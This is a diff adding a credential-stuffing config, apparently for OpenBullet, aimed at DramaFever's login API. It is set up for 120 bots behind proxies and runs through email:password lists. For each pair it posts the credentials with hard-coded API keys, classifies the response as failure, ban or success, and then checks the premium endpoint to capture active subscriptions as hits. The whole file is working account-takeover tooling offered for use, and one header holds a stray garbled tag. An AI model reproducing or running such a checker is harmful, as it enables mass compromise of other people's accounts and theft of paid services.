@@ -1,0 +1,54 @@
+[SETTINGS]
+{
+  "Name": "DramaFeverApi",
+  "SuggestedBots": 120,
+  "LastModified": "2018-07-28T16:37:35.4323498+00:00",
+  "AdditionalInfo": "Enjoy",
+  "Author": "Paparazzi-Nicolas",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 80,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#URL REQUEST POST "https://www.dramafever.com/api/users/login?trans=en" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "DF-Cerberus: ca8f1e0cc9db" 
+  HEADER "X-Consumer-Key: YT8B4uuM6NrHXuVf" 
+#RK KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "\"INVALID_LOGIN\"" 
+  KEYCHAIN Ban OR 
+    KEY ">406 Not Acceptable</" 
+  KEYCHAIN Success OR 
+    KEY "session_id" 
+#URL2 REQUEST GET "https://www.dramafever.com/api/premium/1/auth?trans=en" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "DF-Cerberus: ca8f1e0cc9db</EN_TETE_LS>" 
+  HEADER "X-Consumer-Key: YT8B4uuM6NrHXuVf" 
+#Plan PARSE "<SOURCE>" JSON "plan" Recursive=FALSE -> CAP "Plan" "" "" 
+#SK KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "premium_status\": \"Lapsed Premium\"" 
+  KEYCHAIN Success OR 
+    KEY "\"premium_status\": \"Active\"" 
